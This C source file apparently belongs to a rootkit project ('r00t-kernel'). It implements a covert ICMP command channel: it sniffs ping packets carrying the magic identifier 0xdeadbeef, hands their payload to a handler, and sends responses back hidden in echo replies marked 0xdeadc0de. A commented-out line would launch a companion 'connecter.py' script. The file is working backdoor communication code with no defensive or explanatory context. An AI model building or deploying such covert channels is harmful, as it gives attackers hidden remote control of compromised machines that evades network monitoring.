#include <signal.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include "debug.h"
#include "raw_socket_comms.h"

static int interrupted = 0;
static int raw_socket;

union {
	struct iphdr ip;
	char raw[2048];
} current_packet;


static void handle_interrupt(int signal) {
	fprintf(stderr, "Interrupting ...\n");
	interrupted = 1;
}

int init_communication(void) {
	raw_socket = socket(AF_INET, SOCK_RAW | SOCK_CLOEXEC, IPPROTO_ICMP);
	if (raw_socket < 0) {
		perror("Can't open socket");
		return -1;
	}

	struct sigaction act;
	act.sa_flags = 0;
	act.sa_restorer = 0;
	sigemptyset(&act.sa_mask);
	act.sa_handler = handle_interrupt;
	sigaction(SIGTERM, &act, NULL);
	sigaction(SIGINT, &act, NULL);
	sigaction(SIGQUIT, &act, NULL);
	// sigaction(SIGALRM, &act, NULL);

	return 0;
}

static __attribute__((noinline)) uint16_t csum(uint16_t *ptr, size_t nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char *) &oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short) ~sum;

	return (answer);
}


void handle_incoming_messages(IncomingMessageHandler handler) {
	struct sockaddr_in client_addr;
	socklen_t client_len;

	// int x = system("python3 -u ../../r00t-kernel/connecter.py &");
	// if (x) perror("system");

	while (!interrupted) {
		size_t n = recvfrom(raw_socket, &current_packet.raw, 2048,0,(struct sockaddr *)&client_addr,&client_len);
		if (n > sizeof(struct iphdr) && current_packet.ip.protocol == 1) {
			struct IncomingMessage *message = (current_packet.raw + current_packet.ip.ihl * 4);
			if (n > current_packet.ip.ihl * 4 + sizeof(struct icmphdr) + 4) {
				// checksum
				uint16_t checksum = csum((uint16_t *) message, n - current_packet.ip.ihl * 4);
				if (checksum != 0) {
					fputs("Invalid checksum", stderr);
				} else if (message->icmp.type == ICMP_ECHO && message->ping_identifier_data == 0xdeadbeef) {
					size_t data_len = n - current_packet.ip.ihl * 4 - sizeof(struct icmphdr) - 4;
					// fprintf(stderr, "Received %ld bytes from %08x: %d  %08x\n", n, current_packet.ip.saddr, message->icmp.type, message->ping_identifier_data);
					handler(message, data_len);
				}
			}
		}
	}

	close(raw_socket);
}


void answerRequest(struct IncomingMessage *msg, const char *response, int len) {
	size_t s = sizeof(struct icmphdr) + 4 + len;
	char *buffer = malloc(s);
	struct icmphdr *header = (struct icmphdr *) buffer;
	header->type = ICMP_ECHOREPLY;
	header->code = 0;
	header->checksum = 0;
	// *((uint32_t *) &header->un) = msg->icmp.un;
	header->un = msg->icmp.un;
	*((unsigned int*) (buffer + sizeof(struct icmphdr))) = 0xdeadc0de;
	memmove(buffer + sizeof(struct icmphdr) + 4, response, len);
	header->checksum = csum((uint16_t *) buffer, s);

	struct sockaddr_in addr;
	bzero(&addr, sizeof(struct sockaddr_in));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = current_packet.ip.saddr;
	addr.sin_port = 1;
	size_t s2 = sendto(raw_socket, buffer, s, 0, (struct sockaddr *) &addr, sizeof(struct sockaddr_in));
	if (s2 < 0) perror("Sending failed");
	// printf("Answer: Sent %ld / %ld bytes to 0x%08x\n", s2, s, current_packet.ip.saddr);
	// hexview(response, len);
	free(buffer);
}
